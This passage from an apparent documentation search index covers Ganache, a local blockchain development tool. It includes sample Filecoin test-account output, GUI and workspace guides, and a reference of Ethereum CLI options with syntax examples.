t3v74brbo7e5e5nagvrbgxyccy47znpddhw2e3jzsj2zqjfe2kjnhxk32uxypdzzwpkobyzalsfhx3dfh6g4ea (100 FIL) (7) t3rjlklkxt5ikfzj2wcsukyk4makuq4eugtcnx6y3lwjrw7h7dnfi47npbklvrjbyqe3vxpacpcupukacjvd2q (100 FIL) (8) t3rihx2zizueb7n4dwmfzlsefzfnujbmjurmpsj474pip5qw2yq5migy3t5phofnicfa3bewvan5kwz3mxz7kq (100 FIL) (9) t3wxnwc7gptzjfherhrg6cavic5uc3nb34wjp5ic6comad6xfnfgalxaus7q5ml2jptf5tisuuovogxjqh4jaq (100 FIL) Private Keys ================== (0) 7add859e8942a1009bc7795f5537c6505323a62c4cfc7c27fd48602841cf6b18 (1) ab8fe5451a44b9e12f6bd8ffb1760de60e0614c3563220537e0da29e69337947 (2) e16edeaba1b619a9a8f95cf2bae80fc3532307043f323dfa34911ad8714fe39d (3) 2745fc03b31b2fb8907504b0aa00796c762a39f928260f5ba2dddccdca1933db (4) 27194755b340e21df79d5451f67f054e01a9de18036901e3be08eeb46013a5a6 (5) a51831112131f6520a647fd5a845e39e4b62c780319c7b5e929d15c407b196e6 (6) 841e0ef5e1742949c79ce8bfd42a254debad75c189e89d98292cc60092dcad50 (7) 6dcc42d3ab8e581e1841ccb1c551f3dbb95118fc61f334fba0a17f2d548fbe96 (8) 899081442676fcb592aa3fad880ca1a7a48e7f05eb1caaf16f4c455114ddf598 (9) 525053ec3d8dd48db07177fdb5988acb07749525c0269af6f50d7320c5a29d3b Lotus RPC listening on 127.0.0.1:7777 IPFS RPC listening on 127.0.0.1:5001 If you would like to use the ethereum flavor, please use the ganache-cli package .", "title": "Usage"}, {"location": "docs/ganache/how-to/work-with-filecoin/get-started-with-the-cli/#configuration", "text": "See available options with: ganache filecoin --help", "title": "Configuration"}, {"location": "docs/ganache/how-to/work-with-filecoin/get-started-with-the-gui/", "text": "Get started with the Filecoin-flavored Ganache GUI \u00b6 Install \u00b6 Filecoin-flavored Ganache is included in Ganache UI starting in vTODO and later. If you don't have that version, be sure to update it using the in-app updater or manually install the latest version . Usage \u00b6 First, be sure to select the FILECOIN flavor in the dropdown under QUICKSTART button on the home screen. From here, you can click the QUICKSTART or NEW WORKSPACE buttons. QUICKSTART is the quickest way to get started, and you can save the workspace later. You can read more about workspaces in the dedicated documentation section . Accounts \u00b6 Once Ganache has started, you'll be presented with the Accounts page. Here you can see a list of accounts generated from a random seed and prefunded with some FIL (all configurable ). Filecoin-flavor Ganache doesn't support mnemonics currently, but you can specify the seed in the Settings . Tipsets \u00b6 The Tipsets page shows you a list of the tipsets mined. You can click on a tipset row to see more details, including details of the blocks included in the tipset. If you're not familiar with using Ganache, then you'll quickly learn that most of the blocks of information are clickable for more information. Clicking on a block row in the tipset detail page will bring you to the block's detail page. Messages \u00b6 The Messages page lists the most recent messages. You can click on a message to see the message's detail. You can also get to the message detail page from the block detail page available from the tipset detail page ; Deals \u00b6 The Deals page lists all of the storage deals, regardless of state. These are not clickable currently, but this page is a great place to get an overview. Files \u00b6 The Files page lists all of the pinned files within IPFS. If you're using the Filecoin Network Inspector sample app to create storage deals, those files automatically get pinned with the ipfs.add() JS function it uses. Do note that these are all of your pinned IPFS files, not just those associated with storage deals . You can also click the DOWNLOAD button to save the file to your computer. Configuration \u00b6 You can get to Settings page by pressing the button available in the header bar. From here, you'll see different settings grouped by category. The WORKSPACE tab just lets you change the workspace name if you're not using the Quickstart Workspace. The SERVER tab lets you change the hosts/interfaces and ports for the Lotus and IPFS servers to listen on. The ACCOUNTS & KEYS tab lets you change the default account FIL balance, number of accounts, and random number generator seed. The MINER tab allows you to enable/disable the miner as well as set the mining interval or use automining.", "title": "Use the GUI"}, {"location": "docs/ganache/how-to/work-with-filecoin/get-started-with-the-gui/#get-started-with-the-filecoin-flavored-ganache-gui", "text": "", "title": "Get started with the Filecoin-flavored Ganache GUI"}, {"location": "docs/ganache/how-to/work-with-filecoin/get-started-with-the-gui/#install", "text": "Filecoin-flavored Ganache is included in Ganache UI starting in vTODO and later. If you don't have that version, be sure to update it using the in-app updater or manually install the latest version .", "title": "Install"}, {"location": "docs/ganache/how-to/work-with-filecoin/get-started-with-the-gui/#usage", "text": "First, be sure to select the FILECOIN flavor in the dropdown under QUICKSTART button on the home screen. From here, you can click the QUICKSTART or NEW WORKSPACE buttons. QUICKSTART is the quickest way to get started, and you can save the workspace later. You can read more about workspaces in the dedicated documentation section .", "title": "Usage"}, {"location": "docs/ganache/how-to/work-with-filecoin/get-started-with-the-gui/#accounts", "text": "Once Ganache has started, you'll be presented with the Accounts page. Here you can see a list of accounts generated from a random seed and prefunded with some FIL (all configurable ). Filecoin-flavor Ganache doesn't support mnemonics currently, but you can specify the seed in the Settings .", "title": "Accounts"}, {"location": "docs/ganache/how-to/work-with-filecoin/get-started-with-the-gui/#tipsets", "text": "The Tipsets page shows you a list of the tipsets mined. You can click on a tipset row to see more details, including details of the blocks included in the tipset. If you're not familiar with using Ganache, then you'll quickly learn that most of the blocks of information are clickable for more information. Clicking on a block row in the tipset detail page will bring you to the block's detail page.", "title": "Tipsets"}, {"location": "docs/ganache/how-to/work-with-filecoin/get-started-with-the-gui/#messages", "text": "The Messages page lists the most recent messages. You can click on a message to see the message's detail. You can also get to the message detail page from the block detail page available from the tipset detail page ;", "title": "Messages"}, {"location": "docs/ganache/how-to/work-with-filecoin/get-started-with-the-gui/#deals", "text": "The Deals page lists all of the storage deals, regardless of state. These are not clickable currently, but this page is a great place to get an overview.", "title": "Deals"}, {"location": "docs/ganache/how-to/work-with-filecoin/get-started-with-the-gui/#files", "text": "The Files page lists all of the pinned files within IPFS. If you're using the Filecoin Network Inspector sample app to create storage deals, those files automatically get pinned with the ipfs.add() JS function it uses. Do note that these are all of your pinned IPFS files, not just those associated with storage deals . You can also click the DOWNLOAD button to save the file to your computer.", "title": "Files"}, {"location": "docs/ganache/how-to/work-with-filecoin/get-started-with-the-gui/#configuration", "text": "You can get to Settings page by pressing the button available in the header bar. From here, you'll see different settings grouped by category. The WORKSPACE tab just lets you change the workspace name if you're not using the Quickstart Workspace. The SERVER tab lets you change the hosts/interfaces and ports for the Lotus and IPFS servers to listen on. The ACCOUNTS & KEYS tab lets you change the default account FIL balance, number of accounts, and random number generator seed. The MINER tab allows you to enable/disable the miner as well as set the mining interval or use automining.", "title": "Configuration"}, {"location": "docs/ganache/how-to/work-with-filecoin/overview/", "text": "Overview \u00b6 Ganache supports development with Filecoin , a decentralized storage network with built-in incentives. It is highly recommended you checkout the official Filecoin development documentation before getting started with Filecoin-flavored Ganache. The documentation is split up by the various ways you can use Ganache; each page includes requirements, installation, usage, and configuration for each: CLI GUI NodeJS", "title": "Overview"}, {"location": "docs/ganache/how-to/work-with-filecoin/overview/#overview", "text": "Ganache supports development with Filecoin , a decentralized storage network with built-in incentives. It is highly recommended you checkout the official Filecoin development documentation before getting started with Filecoin-flavored Ganache. The documentation is split up by the various ways you can use Ganache; each page includes requirements, installation, usage, and configuration for each: CLI GUI NodeJS", "title": "Overview"}, {"location": "docs/ganache/how-to/workspaces/create-workspaces/", "text": "Create a workspace \u00b6 The Quickstart workspace is great for getting a development blockchain up and running instantly, but for projects already in progress, or users who need custom configurations, we provide two ways to create a full workspace. See Saving the Current Quickstart Blockchain as a New Workspace if you've already created a quickstart workspace and are ready to add projects or make customizations. If you're starting fresh check out Creating a Workspace from Scratch . Save the current quickstart blockchain as a new workspace \u00b6 As mentioned above, a quickstart workspace resets the blockchain on every restart. Perhaps you've found yourself prototyping in a quickstart workspace to try out a couple of things, but then we want to save the blockchain as a new workspace for later recall. To accomplish this, click the SAVE button near the upper right of the screen when in a quickstart workspace. Create a workspace from scratch \u00b6 You can also create a workspace from the home screen. Selecting either Ethereum or Filecoin from the NEW WORKSPACE dropdown then clicking the NEW WORKSPACE button on the home screen will take us to the options screen to configure your workspace . Configure a workspace \u00b6 A workspace name will be randomly generated for you, but you can go ahead and change it. You can also change any of the other configuration options. When you're ready to start the new workspace, click SAVE WORKSPACE in the top right corner. You will be taken to the home screen. Notice the name of your new workspace near the upper right.", "title": "Create a workspace"}, {"location": "docs/ganache/how-to/workspaces/create-workspaces/#create-a-workspace", "text": "The Quickstart workspace is great for getting a development blockchain up and running instantly, but for projects already in progress, or users who need custom configurations, we provide two ways to create a full workspace. See Saving the Current Quickstart Blockchain as a New Workspace if you've already created a quickstart workspace and are ready to add projects or make customizations. If you're starting fresh check out Creating a Workspace from Scratch .", "title": "Create a workspace"}, {"location": "docs/ganache/how-to/workspaces/create-workspaces/#save-the-current-quickstart-blockchain-as-a-new-workspace", "text": "As mentioned above, a quickstart workspace resets the blockchain on every restart. Perhaps you've found yourself prototyping in a quickstart workspace to try out a couple of things, but then we want to save the blockchain as a new workspace for later recall. To accomplish this, click the SAVE button near the upper right of the screen when in a quickstart workspace.", "title": "Save the current quickstart blockchain as a new workspace"}, {"location": "docs/ganache/how-to/workspaces/create-workspaces/#create-a-workspace-from-scratch", "text": "You can also create a workspace from the home screen. Selecting either Ethereum or Filecoin from the NEW WORKSPACE dropdown then clicking the NEW WORKSPACE button on the home screen will take us to the options screen to configure your workspace .", "title": "Create a workspace from scratch"}, {"location": "docs/ganache/how-to/workspaces/create-workspaces/#configure-a-workspace", "text": "A workspace name will be randomly generated for you, but you can go ahead and change it. You can also change any of the other configuration options. When you're ready to start the new workspace, click SAVE WORKSPACE in the top right corner. You will be taken to the home screen. Notice the name of your new workspace near the upper right.", "title": "Configure a workspace"}, {"location": "docs/ganache/how-to/workspaces/delete-workspaces/", "text": "Delete a workspace \u00b6 To delete a workspace, from the home screen, hover over the workspace name and click the trash can icon on the right hand side. From there you'll see a prompt asking you to confirm the deletion. Click REMOVE to delete the workspace. This action is irreversible! While your linked projects will remain safe and unchanged, the blockchain data (i.e. blocks, transactions, events, etc.) will be deleted.", "title": "Delete a workspace"}, {"location": "docs/ganache/how-to/workspaces/delete-workspaces/#delete-a-workspace", "text": "To delete a workspace, from the home screen, hover over the workspace name and click the trash can icon on the right hand side. From there you'll see a prompt asking you to confirm the deletion. Click REMOVE to delete the workspace. This action is irreversible! While your linked projects will remain safe and unchanged, the blockchain data (i.e. blocks, transactions, events, etc.) will be deleted.", "title": "Delete a workspace"}, {"location": "docs/ganache/how-to/workspaces/edit-workspaces/", "text": "Edit a workspace \u00b6 To edit a workspace without loading it first, from the home screen, hover over the workspace name and click the settings icon on the right hand side. You'll then be able to reconfigure your existing workspace .", "title": "Edit a workspace"}, {"location": "docs/ganache/how-to/workspaces/edit-workspaces/#edit-a-workspace", "text": "To edit a workspace without loading it first, from the home screen, hover over the workspace name and click the settings icon on the right hand side. You'll then be able to reconfigure your existing workspace .", "title": "Edit a workspace"}, {"location": "docs/ganache/how-to/workspaces/load-existing-workspaces/", "text": "Load an existing workspace \u00b6 After at least one workspace has been created, the home screen will now have a list of workspaces for you to choose from. You can scroll through the list to find the desired workspace, and then load the workspace by clicking its name. You will be taken to the main screen. You'll notice that the blockchain state picked up from where you left off (i.e. mnemonic, accounts, associated balances, block height, transactions, etc.).", "title": "Load a workspace"}, {"location": "docs/ganache/how-to/workspaces/load-existing-workspaces/#load-an-existing-workspace", "text": "After at least one workspace has been created, the home screen will now have a list of workspaces for you to choose from. You can scroll through the list to find the desired workspace, and then load the workspace by clicking its name. You will be taken to the main screen. You'll notice that the blockchain state picked up from where you left off (i.e. mnemonic, accounts, associated balances, block height, transactions, etc.).", "title": "Load an existing workspace"}, {"location": "docs/ganache/how-to/workspaces/switch-workspaces/", "text": "Switch workspaces \u00b6 To switch workspaces, click the SWITCH button near the upper right of the screen. You'll be taken to the home screen where you can select a different existing workspace or create a new one.", "title": "Switch workspaces"}, {"location": "docs/ganache/how-to/workspaces/switch-workspaces/#switch-workspaces", "text": "To switch workspaces, click the SWITCH button near the upper right of the screen. You'll be taken to the home screen where you can select a different existing workspace or create a new one.", "title": "Switch workspaces"}, {"location": "docs/ganache/how-to/workspaces/the-quickstart-workspace/", "text": "Create a quickstart workspace \u00b6 The QUICKSTART button on the home screen opens an Ethereum or Filecoin quickstart workspace, depending on which technology is selected. This workspace is meant to provide a clean slate for prototype development.", "title": "Create a quickstart workspace"}, {"location": "docs/ganache/how-to/workspaces/the-quickstart-workspace/#create-a-quickstart-workspace", "text": "The QUICKSTART button on the home screen opens an Ethereum or Filecoin quickstart workspace, depending on which technology is selected. This workspace is meant to provide a clean slate for prototype development.", "title": "Create a quickstart workspace"}, {"location": "docs/ganache/reference/cli-options/", "text": "Ganache command line options \u00b6 This reference describes the syntax of the Ganache command line interface (CLI) options for the Ethereum network. Specify options \u00b6 With the exception of detach mode , the startup options are grouped in the chain , database , logging , miner , wallet , fork , and server namespaces, and should be used as follows on startup: ganache --<namespace>.<option> = <value> You can also use an alias for startup options that have them. For example to set the network ID of a network use ganache -i=<NETWORK_ID> instead of ganache --chain.networkId=<NETWORK_ID> . When using the startup options programmatically, use the following: const options = { < namespace >: { < option >: < value > }}; const provider = ganache . provider ( options ); Note : Command line options are case-sensitive. chain \u00b6 --chain.allowUnlimitedContractSize Syntax Example --chain.allowUnlimitedContractSize = <BOOLEAN> --chain.allowUnlimitedContractSize = true Indicate whether to allow unlimited contract sizes while debugging. When set to true , Ganache behaves differently than in production environments. The default is false . ** --chain.asyncRequestProcessing ** Syntax Example --chain.asyncRequestProcessing = <BOOLEAN> --chain.asyncRequestProcessing = false Indicate whether to asynchronously process requests. When false , only one request is processed at a time. The default is true . --chain.chainId Syntax Example --chain.chainId = <NUMBER> --chain.chainId = 10 The chain ID of the network. The default is 1337 . --chain.networkId , -i Syntax Example --chain.networkId = <NUMBER> --chain.networkId = 10 The network ID that's retrieved when running the net_version JSON-RPC method. The default is the system time when the process starts, or network ID of the forked blockchain if configured. The alias --networkId is deprecated, use -i instead. --chain.time , -t Syntax Example --chain.time = <DATE> --chain.time = 1662596414 Date and time that the first block should start. Accepts the date format supported by the JavaScript Date() constructor . For example Unix epoch or a string. The alias --time is deprecated, use -t instead. --chain.hardfork , -k Syntax Example --chain.hardfork = <STRING> --chain.hardfork = \"arrowGlacier\" The hardfork rules for the EVM. Valid options are: constantinople , byzantium , petersburg , istanbul , muirGlacier , berlin , london , arrowGlacier , and grayGlacier . The default is london . The alias --hardfork has been deprecated, use -k instead. --chain.vmErrorsOnRPCResponse Syntax Example --chain.vmErrorsOnRPCResponse = <BOOLEAN> --chain.vmErrorsOnRPCResponse = true Indicate whether to report runtime errors from EVM code as RPC errors. The default is false . database \u00b6 --database.dbPath Syntax Example --database.dbPath = <STRING> --database.dbPath = \"/User/me/db\" The path to a directory to save the chain database. The aliases --db and --db_path have been deprecated. logging \u00b6 --logging.debug Syntax Example --logging.debug = <BOOLEAN> --logging.debug = true Indicate whether to log debug information. Set to true to log EVM opcodes. The default is false . --logging.quiet , q Syntax Example --logging.quiet = <BOOLEAN> --logging.quiet = true Indicate whether to disable logging. Set to true to disable logging. The default is false . The alias --quiet has been deprecated, use -q instead. --logging.verbose , -v Syntax Example --logging.verbose = <BOOLEAN> --logging.verbose = true Indicate whether to log detailed RPC requests. The default is false . The alias --verbose has been deprecated, use -v instead. miner \u00b6 --miner.blockTime , b Syntax Example --miner.blockTime = <NUMBER> --miner.blockTime = 10 The block time (in seconds) for automatic mining. A block time of 0 enables instamine mode , where new executable transactions are mined instantly. The default is 0 . The alias --blockTime has been deprecated, use -b instead. --miner.timestampIncrement Syntax Example --miner.timestampIncrement = <NUMBER> --miner.timestampIncrement = 5 The amount of time (in seconds) to add to the timestamp of each new block header. The default is clock , which uses your system clock time as the timestamp for each new block. --miner.defaultGasPrice , g Syntax Example --miner.defaultGasPrice = <STRING> --miner.defaultGasPrice = \"0x87369400\" The default gas price in WEI for transactions if not specified. The default is 0x77359400 (2 GWEI). The alias --gasPrice has been deprecated, use -g instead. --miner.blockGasLimit , l Syntax Example --miner.blockGasLimit = <STRING> --miner.blockGasLimit = \"0x87369400\" The block gas limit in WEI. The default is 0x1c9c380 (30 million WEI). The alias --gasLimit has been deprecated, use -l instead. --miner.defaultTransactionGasLimit Syntax Example --miner.defaultTransactionGasLimit = <STRING> --miner.defaultTransactionGasLimit = \"0x16F30\" The default transaction gas limit in WEI. Set to estimate to use an estimate (slows down transaction execution by 40%+). The defaults is 0x15f90 . --miner.difficulty Syntax Example --miner.difficulty = <STRING> --miner.difficulty = \"0x2\" The block difficulty. The default is 0x1 . --miner.callGasLimit Syntax Example --miner.callGasLimit = <STRING> --miner.callGasLimit = \"0x58af080\" The transaction gas limit in WEI for eth_call and eth_estimateGas calls. The default is 0x2faf080 . --miner.instamine Syntax Example --miner.instamine = <STRING> --miner.instamine = \"strict\" The instamine mode which is either eager or strict . In eager mode a transaction is included in a block before its hash is returned to the caller. In strict mode a transaction's hash is returned to the caller before the transaction is included in a block. This value has no effect if --miner.blockTime is not 0 (the default). The default is eager . --miner.coinbase Syntax Example --miner.coinbase = <STRING> --miner.coinbase = \"0xfe3b557e8fb62b89f4916b721be55ceb828dbd73\" The mining reward address. The default is 0x0000000000000000000000000000000000000000 . --miner.extraData Syntax Example --miner.extraData = <STRING> --miner.extraData = \"0x444F4E27542050414E4943202120484F444C2C20484F444C2C20484F444C2021\" A hex string representing the 32 bytes included in the extra data field of a mined block. The default is 0x . --miner.priceBump Syntax Example --miner.priceBump = <STRING> --miner.priceBump = \"0x1\" Minimum price bump percentage needed to replace a transaction that already exists in the transaction pool. The default is 10 . wallet \u00b6 --wallet.accounts Syntax Example --wallet.accounts = <STRING>,<STRING> --wallet.accounts = \"0x8f2a55949038a9610f50fb23b5883af3b4ecb3c3bb792cbcefbd1542c692be63\" , \"0X56BC75E2D63100000\" Account data in the form <private_key>,<initial_balance> . Specify the option multiple times to add multiple private keys with an initial balance. Private keys are 64 characters long, and must include the 0x prefix. The account balance can be an integer, or a 0x -prefixed hex string with either form specifying the initial balance in WEI. The alias --account has been deprecated. --wallet.totalAccounts , -a Syntax Example --wallet.totalAccounts = <NUMBER> --wallet.totalAccounts = 5 Number of accounts to generate at startup. The default is 10 . The alias --accounts has been deprecated, use -a instead. --wallet.deterministic , -d Syntax Example --wallet.deterministic = <BOOLEAN> --wallet.deterministic = true Use a pre-defined, deterministic seed. The default is false . The alias --deterministic has been deprecated, use -d instead. --wallet.seed , -s Syntax Example --wallet.seed = <STRING> --wallet.seed = \"c0157f7c8240459516f42b518c1cba1da942b9a5fb5e6313a948872fcac2742e28250a8b2faef0924ae5d2d59781d7789c4c960a2fef8283d886198d40cf871f\" The seed to generate a mnemonic. The default is a random value unless you specify --wallet.deterministic . The alias --seed has been deprecated, use -s instead. --wallet.mnemonic , -m Syntax Example --wallet.mnemonic = <STRING> --wallet.mnemonic = \"car casual program tourist aerobic broccoli link hamster resemble collect put october\" Use the specified HD wallet mnemonic to generate initial addresses. The default is generated from --wallet.seed . The alias --mnemonic has been deprecated, use -m instead. --wallet.unlockedAccounts , -u Syntax Example using an address Example using an index --wallet.unlockedAccounts = <STRING> --wallet.unlockedAccounts = \"0x8060b4E5dc6a2ee2974873c1ec7B58d6c2932c47\" --wallet.unlockedAccounts = 2 Addresses or address indexes specifying which accounts should be unlocked. You can specify the option multiple times. The alias --unlock has been deprecated, use -u instead. --wallet.lock , -n Syntax Example --wallet.lock = <BOOLEAN> --wallet.lock = true Locks all available accounts, which is good for third party transaction signing. The --secure and --lock aliases have been deprecated, use -n instead. --wallet.passphrase Syntax Example --wallet.passphrase = <STRING> --wallet.passphrase = \"changeme\" The passphrase to use when locking accounts. The alias --passphrase has been deprecated. --wallet.accountKeysPath Syntax Example --wallet.accountKeysPath = <STRING> --wallet.accountKeysPath = \"/Users/me/myKeys.txt\" Specify a file to save accounts and private keys to, for testing. The aliases --account_keys_path and --acctKeys have been deprecated. --wallet.defaultBalance , -e Syntax Example --wallet.defaultBalance = <NUMBER> --wallet.defaultBalance = 120 Specify the default account balance in ether. The default is 1000 . --wallet.hdPath Syntax Example --wallet.hdPath = <STRING> --wallet.hdPath = \"m,44',60',160720',0\" The hierarchical deterministic (HD) path to use when generating accounts. The default is m,44',60',0',0 . fork \u00b6 --fork.url , -f Syntax Example --fork.url = <STRING> --fork.url = \"http://localhost:1337\" Fork from a running Ethereum client. You can optionally specify the block to fork from using an @ character, for example http://localhost:1337@8675309 . The specified URL supports basic authentication credentials as well. For example, wss://<user>:<password>@example.com/ . If you need to use an Infura API key secret, you would use it as follows: wss://:<API-KEY-SECRET>@mainnet.infura.com/ws/v3/<API-KEY> Alternatively, you can use the --fork.username and --fork.password options. --fork.network Syntax Example --fork.network = <STRING> --fork.network = \"goerli\" The network to fork. Valid options are mainnet , goerli , g\u00f6rli , and sepolia . Use the command ganache --fork to automatically fork Mainnet at the latest block. --fork.blockNumber Syntax Example --fork.blockNumber = <NUMBER> --fork.blockNumber = 182354 Block number to fork from. The default is the latest block. --fork.preLatestConfirmations Syntax Example --fork.preLatestConfirmations = <NUMBER> --fork.preLatestConfirmations = 8 When the --fork.blockNumber is set to latest (default), this option specifies the number of blocks before the remote node's latest block to fork from. The default is 5 . --fork.username Syntax Example --fork.username = <STRING> --fork.username = \"JohnDoe\" Username for basic authentication. Does not require setting --fork.password . When combined with --fork.password , the shorthand is { headers: { \"Authorization\": \"Basic {ENCODED-BASIC-HEADER}\" } } . If --fork.headers specifies an authorization header, the header is inserted after the Basic token. --fork.password Syntax Example --fork.password = <STRING> --fork.password = \"changeme\" Password for basic authentication. Does not require setting --fork.username . When combined with --fork.username , the shorthand is { headers: { \"Authorization\": \"Basic {ENCODED-BASIC-HEADER}\" } } . If the --fork.headers specifies an authorization header, the header is inserted after the Basic token. --fork.jwt Syntax Example --fork.jwt = <STRING> --fork.jwt = \"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJwZXJtaXNzaW9ucyI6Iio6KiIsInByaXZhY3lQdWJsaWNLZXkiOiIyVUtIM1ZKVGhrT29Lc2tyTEZwd294Q25uUkFSeW9iVjFiRWRnc2VGSFRzPSIsImV4cCI6IjE2MDA4OTk5OTkwMDIiLCJpYXQiOjE2MzkxNTc2Mjd9.FGf-FmfDQlIPCRDGmNnsHZWlwrUr69d7AIDqQrIrUrSJLiwGpR3NCUhVHIDMpQvDHQYf-sFMZTYvZGrvztYRuBKWMbTfIZKN74onzNJbFIPBVQuUX2HMXmI4VQ3UFB11LShiUJHKLna13qdbqfbgJIO3HetxJhJQxTiwtixfHwyPXl-Nx8HbQy_AWH58lLAUeaoLzN7QIA9kborthBpvfK9C7Sv1lXT1cdCDC4oRKBoiMg2RWFZtGtxFsnWyloangwbhCB6Bc_elqY5nd9WkF4ix95xsP_HgBcouy1sDw6jxn5_LveX53H8owczVWP6S1e6hv6hq2fs6YkSntKMK2g\" Encoded JSON Web Token (JWT) used for authenticating to servers. The shorthand is { headers: { \"Authorization\": \"Bearer {YOUR-ENCODED-JWT}\" } } . If the --fork.headers option specifies an authorization header, the header is inserted after the JWT Bearer token. --fork.userAgent Syntax Example --fork.userAgent = <STRING> --fork.userAgent = \"Ganache/7.0.0-beta.0 (https://www.trufflesuite.com/ganache; ganache<at>trufflesuite.com)]\" The User-Agent header sent to the fork on each request. Sent as Api-User-Agent when used in the browser. Is overridden by a User-Agent defined in the --fork.headers option, if provided. The default is Ganache/VERSION (https://www.trufflesuite.com/ganache; ganache<at>trufflesuite.com) . --fork.origin Syntax Example --fork.origin = <STRING> --fork.origin = \"https://www.trufflesuite.com/ganache\" The Origin header sent to the fork on each request. Ignored in the browser. Is overridden by an Origin value defined in the --fork.headers option, if provided. --fork.headers Syntax Example --fork.headers = <STRING> --fork.headers = \"User-Agent: Ganache/VERSION (https://www.trufflesuite.com/ganache; ganache<at>trufflesuite.com)\" Headers to supply on each request to the forked provider. Headers set here override headers set by other options, unless otherwise specified. The default is \"User-Agent: Ganache/VERSION (https://www.trufflesuite.com/ganache; ganache<at>trufflesuite.com)\" . --fork.requestsPerSecond Syntax Example --fork.requestsPerSecond = <NUMBER> --fork.requestsPerSecond = 10 Restrict the number of requests sent per second to the fork provider. The default is 0 , meaning no limit is applied. --fork.disableCache Syntax Example --fork.disableCache = <BOOLEAN> --fork.disableCache = true Disables caching forking requests. The default is false . --fork.deleteCache Syntax Example --fork.deleteCache = <BOOLEAN> --fork.deleteCache = true Deletes the persistent cache before starting. The default is false . server \u00b6 --server.ws Syntax Example --server.ws = <BOOLEAN> --server.ws = false Enables a WebSocket server. The default is true . --server.wsBinary Syntax Example --server.wsBinary = <BOOLEAN> --server.wsBinary = false Indicates whether WebSocket should respond with binary data (ArrayBuffers) or strings. Options are true , false , or auto . The default is auto . --server.rpcEndpoint Syntax Example --server.rpcEndpoint = <STRING> --server.rpcEndpoint = \"/v3\" Defines the endpoint route the HTTP and WebSocket servers listen on. The default is / for Ethereum and /rpc/v0 for Filecoin. --server.host , -h Syntax Example --server.host = <STRING> --server.host = \"127.0.0.1\" The hostname to listen on. The default is 127.0.0.1 . The aliases --host and --hostname have been deprecated, use -h instead. --server.port , -p Syntax Example --server.port = <NUMBER> --server.port = 9545 The port to listen on. The default is 8545 . The alias --port has been deprecated, use -p instead. Detach mode \u00b6 Ganache can be started as a background process by passing the --detach option, along with any valid combination of start-up options. --detach , -D , --\ud83d\ude08 Runs Ganache as a background process, outputting a friendly name that can be used to reference the instance when managing the instance via the ganache instances command. Ganache will only return to the command line once it is ready to receive requests, making it handy for scripting - for example, you can start Ganache, execute a series of tests, and teardown the instance when complete with a one-liner: GANACHE = $( ganache --detach ) && npm run test ; ganache instances stop $GANACHE Or if you are running PowerShell, you can do: $GANACHE = ganache - -detach ; npm run test ; ganache instances stop $GANACHE ; Remove-Variable GANACHE Manage detached instances \u00b6 The ganache instances <sub-command> can be used to manage instances of Ganache running in detach mode. list \u00b6 Output the list of instances running in detach mode. instances list Syntax Example ganache instances list $ ganache instances list \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 PID \u2502 Name \u2502 Flavor \u2502 Version \u2502 Host \u2502 Uptime \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502 12182 \u2502 salted_caramel_ganache \u2502 ethereum \u2502 7 .6.0 \u2502 127 .0.0.1:8545 \u2502 36s \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 stop \u00b6 Stop an instance of ganache running in detach mode. instances stop Syntax Example ganache instances stop <name> ganache instances stop salted_caramel_ganache", "title": "CLI options"}, {"location": "docs/ganache/reference/cli-options/#ganache-command-line-options", "text": "This reference describes the syntax of the Ganache command line interface (CLI) options for the Ethereum network.", "title": "Ganache command line options"}, {"location": "docs/ganache/reference/cli-options/#specify-options", "text": "With the exception of detach mode , the startup options are grouped in the chain , database , logging , miner , wallet , fork , and server namespaces, and should be used as follows on startup: ganache --<namespace>.<option> = <value> You can also use an alias for startup options that have them. For example to set the network ID of a network use ganache -i=<NETWORK_ID> instead of ganache --chain.networkId=<NETWORK_ID> . When using the startup options programmatically, use the following: const options = { < namespace >: { < option >: < value > }}; const provider = ganache . provider ( options ); Note : Command line options are case-sensitive.", "title": "Specify options"}, {"location": "docs/ganache/reference/cli-options/#chain", "text": "--chain.allowUnlimitedContractSize Syntax Example --chain.allowUnlimitedContractSize = <BOOLEAN> --chain.allowUnlimitedContractSize = true Indicate whether to allow unlimited contract sizes while debugging. When set to true , Ganache behaves differently than in production environments. The default is false . ** --chain.asyncRequestProcessing ** Syntax Example --chain.asyncRequestProcessing = <BOOLEAN> --chain.asyncRequestProcessing = false Indicate whether to asynchronously process requests. When false , only one request is processed at a time. The default is true . --chain.chainId Syntax Example --chain.chainId = <NUMBER> --chain.chainId = 10 The chain ID of the network. The default is 1337 . --chain.networkId , -i Syntax Example --chain.networkId = <NUMBER> --chain.networkId = 10 The network ID that's retrieved when running the net_version JSON-RPC method. The default is the system time when the process starts, or network ID of the forked blockchain if configured. The alias --networkId is deprecated, use -i instead. --chain.time , -t Syntax 